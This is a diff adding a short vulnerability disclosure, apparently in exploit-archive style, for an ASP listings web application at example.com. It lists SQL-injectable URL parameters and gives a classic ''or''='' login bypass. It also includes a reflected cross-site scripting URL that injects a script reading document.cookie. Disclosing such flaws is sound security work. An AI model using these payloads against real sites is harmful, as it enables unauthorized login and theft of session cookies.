@@ -1,0 +1,12 @@
+SQL-Injection
+http://www.example.com/asp/detail.asp?l=&amp;p=&#039;[sql]
+http://www.example.com/asp/listings.asp?l=&#039;[sql]
+http://www.example.com/asp/listings.asp?s=search&amp;typ=&#039;[sql]
+http://www.example.com/asp/listings.asp?s=search&amp;typ=4&amp;loc=&#039;[sql]
+Authentication-bypass via SQL-injection:
+login using
+user: &#039;or&#039;&#039;=&#039;
+passwd: &#039;or&#039;&#039;=&#039;
+
+Cross-Site Scripting
+http://www.example.com/asp/listings.asp?s=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
